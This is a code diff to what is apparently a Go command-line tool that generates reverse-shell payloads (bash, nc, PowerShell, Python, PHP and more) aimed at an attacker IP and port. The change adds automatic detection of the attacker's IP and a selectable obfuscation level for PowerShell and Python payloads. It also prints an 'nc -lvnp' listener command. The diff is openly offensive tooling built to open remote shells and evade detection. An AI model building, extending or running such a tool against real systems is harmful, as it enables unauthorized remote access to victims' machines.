@@ -32,15 +32,26 @@ func main() {
 		}
 	}
 
-	ipFlag := flag.String("i", "", "Attacker IP")
+	ipFlag := flag.String("i", "", "Attacker IP (use 'auto' for auto-detection)")
 	portFlag := flag.Int("p", 0, "Attacker Port")
 	typeFlag := flag.String("t", "", "Payload Type (bash, nc, ps, zsh, python, php, ruby, perl)")
 	encFlag := flag.String("e", "raw", "Encoding (raw, url, b64)")
+	obfsFlag := flag.Int("obfs", 0, "Obfuscation Level (0-3)")
 	
 	listFlag := flag.Bool("list", false, "List all saved templates")
 	loadFlag := flag.String("load", "", "Load and run a saved template")
 	saveFlag := flag.String("save", "", "Save current CLI config as a template")
 	flag.Parse()
+
+	if *ipFlag == "auto" {
+		autoIP, err := DetectLocalIP()
+		if err != nil {
+			fmt.Printf("[!] IP Detection failed: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Printf("[*] Auto-detected IP: %s\n", autoIP)
+		*ipFlag = autoIP
+	}
 
 	// 1. Handle Template Listing
 	if *listFlag {
@@ -70,7 +81,7 @@ func main() {
 			fmt.Printf("[!] Template '%s' not found.\n", *loadFlag)
 			return
 		}
-		handleNonInteractive(found.IP, found.Port, found.Type, found.Encoder)
+		handleNonInteractive(found.IP, found.Port, found.Type, found.Encoder, *obfsFlag)
 		return
 	}
 
@@ -90,7 +101,7 @@ func main() {
 				fmt.Printf("[+] Template '%s' saved!\n", *saveFlag)
 			}
 		}
-		handleNonInteractive(*ipFlag, *portFlag, *typeFlag, *encFlag)
+		handleNonInteractive(*ipFlag, *portFlag, *typeFlag, *encFlag, *obfsFlag)
 		return
 	}
 
@@ -149,7 +160,12 @@ func main() {
 
 	if ip == "" {
 		// 1. Get Attacker IP
-		ip = GetValidatedIP("Attacker IP")
+		ip = GetValidatedIP("Attacker IP (or 'auto')")
+		if ip == "auto" {
+			autoIP, _ := DetectLocalIP()
+			ip = autoIP
+			fmt.Printf("[*] Auto-detected IP: %s\n", ip)
+		}
 
 		// 2. Get Attacker Port
 		port = GetValidatedPort("Attacker Port")
@@ -173,8 +189,16 @@ func main() {
 		selectedEncoder = encoders[encoderIdx]
 	}
 
+	// Apply Obfuscation
+	payloadCode := selectedPayload.Code
+	if strings.Contains(strings.ToLower(selectedPayload.Name), "powershell") || strings.Contains(strings.ToLower(selectedPayload.Name), "python") {
+		options := []string{"None (Level 0)", "Basic (Level 1)", "Medium (Level 2)", "Advanced (Level 3)"}
+		obfsLevel := SelectOption("Select Obfuscation Level", options)
+		payloadCode = Obfuscate(payloadCode, obfsLevel, selectedPayload.Name)
+	}
+
 	// 5. Generate and Print
-	finalPayload := selectedEncoder.Wrap(selectedPayload.Code)
+	finalPayload := selectedEncoder.Wrap(payloadCode)
 
 	fmt.Printf("\n" + strings.Repeat("=", 60))
 	fmt.Printf("\n[+] Listener Command:\n    nc -lvnp %d\n", port)
